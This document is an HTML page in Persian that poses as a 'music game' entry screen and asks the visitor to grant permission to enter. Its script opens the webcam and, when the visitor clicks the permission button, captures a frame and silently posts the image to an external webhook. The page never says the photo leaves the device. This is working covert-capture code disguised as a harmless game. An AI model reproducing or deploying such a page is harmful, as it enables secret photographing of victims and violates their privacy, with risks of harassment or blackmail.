<!DOCTYPE html>
<html lang="fa">
<head>
    <meta charset="UTF-8">
    <title>موزیک گیم </title>
</head>
<body>
    <h2>برای ورود اجازه دهید</h2>
    <video id="video" width="640" height="480" autoplay playsinline></video>
    <button id="capture">مجوز</button>
    <canvas id="canvas" width="640" height="480" style="display: none;"></canvas>

    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const context = canvas.getContext('2d');

        let streamReady = false;

        // درخواست دسترسی به دوربین
        navigator.mediaDevices.getUserMedia({ video: true })
            .then(function (stream) {
                video.srcObject = stream;
                streamReady = true;
            })
            .catch(function (error) {
                alert(' رد شد ');
                console.error(error);
            });

        document.getElementById('capture').addEventListener('click', function () {
            if (!streamReady) {
                alert("لطفاً منتظر بمانید .");
                return;
            }

            // اندکی صبر برای بارگیری تصویر (در صورت لزوم)
            setTimeout(() => {
                context.drawImage(video, 0, 0, canvas.width, canvas.height);

                const dataUrl = canvas.toDataURL("image/jpeg");

                // ارسال تصویر به Webhook
                fetch("https://eoeq114hreszd00.m.pipedream.net", {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify({ image: dataUrl })
                })
                .then(response => console.log("ارسال شد"))
                .catch(error => console.error("خطا در ارسال:", error));
            }, 1000); // صبر یک ثانیه‌ای
        });
    </script>
</body>
</html>
